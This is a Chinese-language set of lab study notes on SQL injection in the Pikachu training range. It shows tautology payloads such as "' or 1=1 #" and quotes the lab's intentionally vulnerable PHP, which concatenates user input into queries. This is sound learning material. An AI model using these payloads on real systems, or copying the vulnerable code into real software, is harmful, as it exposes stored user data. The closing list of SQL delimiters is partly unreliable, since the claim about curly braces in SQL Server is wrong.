---
title: "sql注入1-4"
date: 2024-07-23
---
本文档是基于[pikachu 靶场全关卡讲解（含代码审计）](https://www.bilibili.com/video/BV1Bp4y1q7XF)编写的 sql 注入学习笔记  
~~因为队友太拉胯，而不得不努力，舍弃暑假快乐时光去学习 web 的密码手~~  
~~还要搞逆向，这下真成全能手了 😅~~

---

# 数字型注入

1. 观察网页，发现是下拉列表选择数字，进行查询  
   ![sql_number_1.png](image/sql_number_1.png)
2. **Burp Suite**抓包发现**post**提交数据位置，存在注入点  
   ![sql_number_2.png](image/sql_number_2.png)
3. 将数据包发送到**Repeater 模块**，进行下一步处理

~~接下来的事情就是瞎猜~~
随便输入一个数字进行查询，返回结果如下：

```
hello,vince
your email is: vince@pikachu.com
```

返回了**_用户名 vince_**和**_邮箱vince@pikachu.com_**，说明有**两个字段**  
对于数字型，后台的代码应该是以下的形式：

```sql
SELECT 字段1,字段2 from 表名 where id = $id;
```

现在尝试构建 payload，原理是**拼接**  
**_将 id 的值设置为`1 or 1=1`_**，后台运行的代码就会变成：

```sql
SELECT 字段1,字段2 from 表名 where id = 1 or 1=1;
```

注意`id = 1 or 1=1`，用`or`将条件分为两部分，后面的`1=1`使得这一整个判断为真(所以`id = 1 or true`也行)  
相当于后台代码变成了：

```sql
SELECT 字段1,字段2 from 表名 where true;
```

`where`后面的**过滤条件**永远为**真**，**输出表内所有数据**

介绍一个小技巧，在查看响应结果时，返回的代码实在太丑陋了  
我们点一下**Render**(汉化后是**页面渲染**)  
![sql_number_4.png](image/sql_number_4.png)
这样就能很直观的看到结果  
贴一下原代码,位置在`pikachu-master\vul\sqli\sqli_id.php`24 行：

```php
if(isset($_POST['submit']) && $_POST['id']!=null){
    //这里没有做任何处理，直接拼到select里面去了,形成Sql注入
    $id=$_POST['id'];
    $query="select username,email from member where id=$id";
    $result=execute($link, $query);
    //这里如果用==1,会严格一点
    if(mysqli_num_rows($result)>=1){
        while($data=mysqli_fetch_assoc($result)){
            $username=$data['username'];
            $email=$data['email'];
            $html.="<p class='notice'>hello,{$username} <br />your email is: {$email}</p>";
        }
    }else{
        $html.="<p class='notice'>您输入的user id不存在，请重新输入！</p>";
    }
}
```

---

# 字符型注入

1. 观察网页，发现是输入框输入字符串，进行查询  
   ![sql_string_1.png](image/sql_string_1.png)
2. 抓包发现**get**提交数据位置，存在注入点  
   ![sql_string_2.png](image/sql_string_2.png)
3. 将数据包发送到**Repeater**，进行下一步处理  
   输入`kobe`进行查询，返回结果如下：

```
your uid:3
your email is: kobe@pikachu.com
```

返回了**_uid:3_**和**_邮箱kobe@pikachu.com_**，说明有**两个字段**  
对于字符型，后台的代码**大概**是以下的形式：

```sql
SELECT 字段1,字段2 from 表名 where name = '$name';
```

注意我们输入的**变量$name**被**引号**包裹，后台代码会将其视为**字符串**  
可能是单引号或双引号，需要进行测试

1. 输入双引号`"`进行查询，返回结果  
   `您输入的username不存在，请重新输入！`  
   我们输入的双引号`"`处于中间，与前后引号不同，所以双引号`"`被视为字符串进行查询  
   **说明不是双引号包裹**
2. 输入单引号`'`进行查询，返回结果  
   `You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ''''' at line 1`  
   意思是出现**语法错误**，我们输入的单引号使它构成了`'''`三个单引号，前两个单引号配对，第三个单引号没有配对  
   **说明是单引号包裹`'$name'`**

现在我们确认了，后台代码应该是以下的形式：

```sql
SELECT 字段1,字段2 from 表名 where name = '$name';
```

现在尝试构建 payload,原理是**闭合**  
**_输入`kobe' or 1=1 #`或者`kobe' or 1=1 -- `(注意--后面有一个空格)_**，后台代码会变成：

```sql
SELECT 字段1,字段2 from 表名 where name = 'kobe' or 1=1 -- '
SELECT 字段1,字段2 from 表名 where name = 'kobe' or 1=1 #'
```

- 前面的`kobe'`中的单引号被闭合(有没有`kobe`无所谓，主要是**与第一个引号配对闭合**)
- 中间的`or 1=1`**构造过滤条件真**
- 后面的`-- '`(注意空格)或`#`将以后的语句注释掉(重点是**注释掉原来第二个引号**)

相当于后台代码变成了：

```sql
SELECT 字段1,字段2 from 表名 where true;
```

和前面的数字型注入一样，`where`后面的**过滤条件**永远为**真**，**输出表内所有数据**  
![sql_string_3.png](image/sql_string_3.png)

贴一下原代码,位置在`pikachu-master\vul\sqli\sqli_str.php`24 行：

```php
if(isset($_GET['submit']) && $_GET['name']!=null){
    //这里没有做任何处理，直接拼到select里面去了
    $name=$_GET['name'];
    //这里的变量是字符型，需要考虑闭合
    $query="select id,email from member where username='$name'";
    $result=execute($link, $query);
    if(mysqli_num_rows($result)>=1){
        while($data=mysqli_fetch_assoc($result)){
            $id=$data['id'];
            $email=$data['email'];
            $html.="<p class='notice'>your uid:{$id} <br />your email is: {$email}</p>";
        }
    }else{

        $html.="<p class='notice'>您输入的username不存在，请重新输入！</p>";
    }
}
```

---

# 搜索型注入

提示输入用户名的一部分搜索的试试看
数据库中对表里的内容进行匹配性查询时，使用的语句如下：

```sql
select * from 表名 where 字段 like '%关键词%';
```

我们输入的关键词被**百分号**和**引号**包裹，后台代码会将其视为**字符串**，进行模糊查询，返回匹配的结果。  
我们尝试构建 payload,原理和**字符型注入**一样，只是多了一个**百分号**  
**_输入`%' or 1=1 #`或者`%' or 1=1 -- `(注意--后面有一个空格)_**，后台代码会变成：

```sql
select * from 表名 where 字段 like '%%' or 1=1 #%';
select * from 表名 where 字段 like '%%' or 1=1 -- %';
```

- 前面的`%'`中的单引号被闭合(主要是**与第一个引号和百分号配对闭合**)
- 中间的`or 1=1`**构造过滤条件真**
- 后面的`-- '`(注意空格)或`#`将以后的语句注释掉(重点是**注释掉原来第二个引号和百分号**)

相当于后台代码变成了：

```sql
select * from 表名 where 字段 过滤条件 true;
```

和前面的数字型注入一样，后面的**过滤条件**永远为**真**，**输出表内所有数据**  
![sql_search_1.png](image/sql_search_1.png)  
原码位置在`pikachu-master\vul\sqli\sqli_search.php`24 行

---

# xx 型注入(总结)

总而言之，就是对 SQL 中的各种类型的输入**_进行闭合测试_**，**_构造合法 SOL 语句_**，**_欺骗后台执行_**

- **_配对闭合_**
- **_构造过滤条件真_**
- **_注释掉原来第二个包裹符号_**

对于这道题，后台语句是

```sql
select id,email from member where username=('$name');
```

慢慢试出来引用符吧，或者过几天学一下 sqlmap 能不能搞
定界符或引用符主要包括以下几种：

1. **单引号'**：用于定义字符串字面量，在 SQL 语句中常用于包裹字符串值。
2. **双引号"**：在某些编程语言中用于定义字符串字面量，或者在 SQL 中（特别是在某些数据库系统如 PostgreSQL 中）用于标识保留字或标识符。
3. **反引号`**：(在键盘的 tab 键上方)在 SQL 中用于标识 MySQL、MariaDB 和其他一些数据库系统中的标识符。
4. **小括号()**：用于分组表达式或函数参数，以及在 SQL 中用于定义子查询。
5. **大括号{}**：在某些编程语言中用于代码块，或者在 SQL 中用于标识分区名或表名（特别是在 SQL Server 中）。
6. **方括号[]**：在某些编程语言中用于数组索引，或者在 SQL 中用于标识 SQL Server 中的保留字或标识符。

以下是这些包裹符号的一些常见用途：

```sql
单引号和双引号在SQL中用于包裹字符串值：
SELECT * FROM users WHERE name = 'John Doe';
SELECT * FROM users WHERE name = "John Doe";

反引号用于MySQL中的标识符：
SELECT `column` FROM `table`;

小括号用于分组或函数参数：
SELECT (column1 + column2) FROM table;
SELECT MAX(column) FROM table;

大括号用于标识SQL Server中的对象名称：
SELECT * FROM {table_name};

方括号用于SQL Server中的保留字或标识符：
SELECT [column] FROM [table];
```

---
